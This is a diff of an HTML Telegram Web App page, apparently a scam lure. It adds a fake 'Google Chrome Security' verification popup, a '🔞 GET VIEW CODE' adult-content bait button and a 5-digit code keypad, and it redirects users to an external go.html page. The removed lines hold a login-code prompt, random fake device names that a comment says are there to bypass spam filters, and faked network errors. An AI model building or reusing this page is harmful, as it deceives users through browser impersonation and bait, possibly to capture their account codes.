@@ -7,100 +7,107 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { 
-            margin: 0; padding: 0; font-family: sans-serif; 
-            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg'); 
-            background-size: cover; background-position: center;
-            display: flex; justify-content: center; align-items: center; height: 100vh; color: white; overflow: hidden; 
+            margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: linear-gradient(rgba(0,0,0,0.2), rgba(0,0,0,0.2)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg'); 
+            background-size: cover; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; 
         }
+        
+        /* Chrome/iOS Style Popup */
+        .system-notification {
+            position: absolute; top: 20px; width: 90%; max-width: 350px;
+            background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(10px);
+            border-radius: 15px; padding: 12px; display: flex; align-items: center;
+            color: #333; box-shadow: 0 4px 15px rgba(0,0,0,0.3); animation: slideDown 0.5s ease;
+        }
+        @keyframes slideDown { from { transform: translateY(-100px); } to { transform: translateY(0); } }
+        
+        .system-notification img { width: 30px; margin-right: 12px; }
+        .system-notification .text { font-size: 13px; }
+
         .card { 
-            background: rgba(255, 255, 255, 0.15); /* পিছনের ছবি দেখার জন্য খুবই স্বচ্ছ */
-            backdrop-filter: blur(15px); border-radius: 30px; padding: 30px 20px; 
+            background: rgba(255, 255, 255, 0.1); /* অনেক বেশি স্বচ্ছ করা হয়েছে */
+            backdrop-filter: blur(15px); border-radius: 30px; padding: 25px 20px; 
             width: 320px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.2); 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        
-        /* স্প্যাম বাইপাস করতে ডিভাইস ইনফো */
-        .device-info {
-            font-size: 11px; color: #d1d1d1; margin-bottom: 15px; 
-            background: rgba(0,0,0,0.3); padding: 5px; border-radius: 5px;
+            margin-top: 50px;
         }
 
-        .instruction { background: rgba(255, 255, 255, 0.9); color: #222; padding: 12px; border-radius: 12px; margin-bottom: 20px; font-size: 14px; font-weight: bold; }
-        
-        /* স্বচ্ছ OTP ইনপুট বক্স */
-        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 25px; }
+        .instruction { background: #007aff; color: white; padding: 10px; border-radius: 10px; margin-bottom: 20px; font-size: 14px; }
+
+        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 20px; }
         .otp-inputs input { 
-            width: 48px; height: 60px; 
-            background: rgba(255, 255, 255, 0.1); 
-            border: 1px solid rgba(255, 255, 255, 0.5); 
-            border-radius: 12px; text-align: center; font-size: 26px; 
-            color: #fff; font-weight: bold; outline: none;
+            width: 45px; height: 55px; background: rgba(255, 255, 255, 0.2); 
+            border: 1px solid rgba(255, 255, 255, 0.4); border-radius: 10px; 
+            text-align: center; font-size: 24px; color: white; outline: none; 
         }
 
-        .btn { border: none; width: 100%; padding: 16px; border-radius: 12px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; margin-bottom: 15px; }
-        .btn-login { background: #34a853; box-shadow: 0 4px 0 #288a42; }
-        .btn-video { background: #ff0050; box-shadow: 0 4px 0 #b3003b; }
-        .btn-logout { background: #555; padding: 10px; font-size: 14px; }
+        .get-code-btn { 
+            background: #ff3b30; border: none; width: 100%; padding: 15px; 
+            border-radius: 12px; color: white; font-weight: bold; font-size: 16px; 
+            cursor: pointer; margin-bottom: 20px;
+        }
 
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 10px; }
-        .key { background: rgba(255, 255, 255, 0.2); padding: 15px; border-radius: 10px; font-size: 22px; font-weight: bold; cursor: pointer; border: 1px solid rgba(255,255,255,0.2); }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .key { 
+            background: rgba(255, 255, 255, 0.2); padding: 15px; border-radius: 10px; 
+            font-size: 20px; font-weight: 500; cursor: pointer; transition: 0.2s;
+        }
         .key:active { background: rgba(255, 255, 255, 0.4); }
+
+        .footer-btns { display: flex; gap: 10px; margin-top: 15px; }
+        .footer-btn { 
+            flex: 1; padding: 10px; border-radius: 8px; border: none; 
+            font-size: 13px; cursor: pointer; font-weight: bold;
+        }
+        .btn-main { background: #34c759; color: white; }
     </style>
 </head>
 <body>
+
+    <!-- Chrome Style Pop up -->
+    <div class="system-notification">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" alt="Chrome">
+        <div class="text">
+            <b>Google Chrome Security</b><br>
+            Verification required to continue viewing.
+        </div>
+    </div>
+
     <div class="card">
-        <!-- ডিভাইস ইনফো -->
-        <div id="device-info" class="device-info">Device: Checking...</div>
-
-        <!-- লগইন করার আগের পেজ -->
-        <div id="login-section">
-            <div class="instruction">Enter the 5-digit code to Login</div>
-            <div class="otp-inputs" id="otp-container">
-                <input type="text" maxlength="1" readonly>
-                <input type="text" maxlength="1" readonly>
-                <input type="text" maxlength="1" readonly>
-                <input type="text" maxlength="1" readonly>
-                <input type="text" maxlength="1" readonly>
-            </div>
-            
-            <button class="btn btn-login" onclick="attemptLogin()">লগইন করুন</button>
-            
-            <div class="keypad">
-                <div class="key" onclick="pressKey('1')">1</div>
-                <div class="key" onclick="pressKey('2')">2</div>
-                <div class="key" onclick="pressKey('3')">3</div>
-                <div class="key" onclick="pressKey('4')">4</div>
-                <div class="key" onclick="pressKey('5')">5</div>
-                <div class="key" onclick="pressKey('6')">6</div>
-                <div class="key" onclick="pressKey('7')">7</div>
-                <div class="key" onclick="pressKey('8')">8</div>
-                <div class="key" onclick="pressKey('9')">9</div>
-                <div class="key"></div>
-                <div class="key" onclick="pressKey('0')">0</div>
-                <div class="key" onclick="pressKey('back')">✖️</div>
-            </div>
+        <div class="instruction">Enter the 5-digit view code!</div>
+        <div class="otp-inputs" id="otp-container">
+            <input type="text" maxlength="1" readonly>
+            <input type="text" maxlength="1" readonly>
+            <input type="text" maxlength="1" readonly>
+            <input type="text" maxlength="1" readonly>
+            <input type="text" maxlength="1" readonly>
+        </div>
+        
+        <button class="get-code-btn" onclick="openServiceChat()">🔞 GET VIEW CODE 🔞</button>
+        
+        <div class="keypad">
+            <div class="key" onclick="pressKey('1')">1</div>
+            <div class="key" onclick="pressKey('2')">2</div>
+            <div class="key" onclick="pressKey('3')">3</div>
+            <div class="key" onclick="pressKey('4')">4</div>
+            <div class="key" onclick="pressKey('5')">5</div>
+            <div class="key" onclick="pressKey('6')">6</div>
+            <div class="key" onclick="pressKey('7')">7</div>
+            <div class="key" onclick="pressKey('8')">8</div>
+            <div class="key" onclick="pressKey('9')">9</div>
+            <div class="key"></div>
+            <div class="key" onclick="pressKey('0')">0</div>
+            <div class="key" onclick="pressKey('back')">✖️</div>
         </div>
 
-        <!-- লগইন হওয়ার পর ভিডিও বাটন পেজ -->
-        <div id="video-section" style="display: none;">
-            <div class="instruction" style="background: #4CAF50; color: white;">✅ আপনি এখন লগইন আছেন</div>
-            
-            <button class="btn btn-video" onclick="openGoPage()">🔞 ভিডিও দেখুন</button>
-            
-            <p style="font-size: 12px; color: #ddd; margin-top: 20px;">ভিডিও দেখতে উপরের বাটনে ক্লিক করুন</p>
-            <button class="btn btn-logout" onclick="logout()">লগ আউট করুন</button>
+        <div class="footer-btns">
+            <button class="footer-btn btn-main" onclick="tg.close()">🏠 Back to Main Bot</button>
         </div>
-
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
-
-        // র‍্যান্ডম ডিভাইস নাম দেখানো
-        const devices = ["iPhone 15 Pro - iOS 17", "Chrome on Windows 11", "Samsung S24 Ultra", "Safari on macOS"];
-        document.getElementById("device-info").innerText = "Login Source: " + devices[Math.floor(Math.random() * devices.length)];
 
         let inputs = document.querySelectorAll('#otp-container input');
         let currentIdx = 0;
@@ -117,37 +124,8 @@
             }
         }
 
-        function attemptLogin() {
-            let code = Array.from(inputs).map(i => i.value).join('');
-            
-            if (code.length < 5) {
-                tg.showAlert("দয়া করে ৫-সংখ্যার পিন দিন।");
-                return;
-            }
-
-            // API Block এর বদলে "আবার চেষ্টা করুন" এরর
-            let failChance = Math.random();
-            if (failChance < 0.2) { 
-                tg.showAlert("নেটওয়ার্ক এরর! দয়া করে আবার চেষ্টা করুন।");
-            } else {
-                // ভিডিও বাটন দেখাবে এবং লগইন ফরম মুছে যাবে
-                document.getElementById('login-section').style.display = 'none';
-                document.getElementById('video-section').style.display = 'block';
-            }
-        }
-
-        function logout() {
-            // ভিডিও বাটন রিমুভ হবে এবং আবার লগইন ফরম আসবে
-            document.getElementById('video-section').style.display = 'none';
-            document.getElementById('login-section').style.display = 'block';
-            
-            // পিন ক্লিয়ার করা
-            inputs.forEach(i => i.value = '');
-            currentIdx = 0;
-            tg.showAlert("আপনি লগ আউট হয়েছেন।");
-        }
-
-        function openGoPage() {
+        function openServiceChat() {
+            // go.html এ রিডাইরেক্ট করবে
             const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
             tg.openLink(redirectUrl);
         }
